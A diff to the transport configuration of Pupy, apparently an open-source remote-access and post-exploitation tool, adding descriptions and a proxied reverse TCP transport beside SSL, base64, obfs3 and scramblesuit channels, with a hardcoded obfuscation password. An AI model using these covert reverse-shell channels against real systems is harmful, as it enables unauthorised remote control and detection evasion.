@@ -2,7 +2,7 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 from .servers import PupyTCPServer
-from .clients import PupyTCPClient, PupySSLClient
+from .clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient
 from .transports import dummy, b64
 from .transports.obfs3 import obfs3
 import logging
@@ -27,12 +27,13 @@ def ssl_authenticator():
 	config.read("pupy.conf")
 	return SSLAuthenticator(config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep), config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep), ciphers="SHA256+AES256:SHA1+AES256:@STRENGTH")
 
-#scramblesuit password must be 20 char
+#scramblesuit password must be 20 char long
 scramblesuit_passwd="th!s_iS_pupy_sct_k3y"
 
 transports=dict()
 
 transports["tcp_ssl"]={
+		"info" : "Simple reverse TCP payload with SSL",
 		"server" : PupyTCPServer,
 		"client": PupySSLClient,
 		"client_kwargs" : {},
@@ -44,6 +45,7 @@ transports["tcp_ssl"]={
 		"server_transport_kwargs": {},
 	}
 transports["tcp_cleartext"]={
+		"info" : "Simple reverse TCP payload (cleartext)",
 		"server" : PupyTCPServer,
 		"client": PupyTCPClient,
 		"client_kwargs" : {},
@@ -54,7 +56,20 @@ transports["tcp_cleartext"]={
 		"client_transport_kwargs": {},
 		"server_transport_kwargs": {},
 	}
+transports["tcp_cleartext_proxy"]={
+		"info" : "Simple reverse TCP payload in cleartext passing through a SOCKS4/SOCKS5/HTTP proxy",
+		"server" : PupyTCPServer,
+		"client": PupyProxifiedTCPClient,
+		"client_kwargs" : {'proxy_addr':'127.0.0.1', 'proxy_port':8080, 'proxy_type':'HTTP'},
+		"authenticator" : None,
+		"stream": PupySocketStream ,
+		"client_transport" : dummy.DummyPupyTransport,
+		"server_transport" : dummy.DummyPupyTransport,
+		"client_transport_kwargs": {},
+		"server_transport_kwargs": {},
+	}
 transports["tcp_base64"]={
+		"info" : "Reverse TCP payload with base64 encoding",
 		"server" : PupyTCPServer,
 		"client": PupyTCPClient,
 		"client_kwargs" : {},
@@ -66,6 +81,7 @@ transports["tcp_base64"]={
 		"server_transport_kwargs": {},
 	}
 transports["obfs3"]={
+		"info" : "Reverse TCP Payload using obfs3 transport",
 		"server" : PupyTCPServer,
 		"client": PupyTCPClient,
 		"client_kwargs" : {},
@@ -78,6 +94,7 @@ transports["obfs3"]={
 	}
 if scramblesuit:
 	transports["scramblesuit"]={
+			"info" : "Reverse TCP Payload using scramblesuit transport",
 			"server" : PupyTCPServer,
 			"client": PupyTCPClient,
 			"client_kwargs" : {},
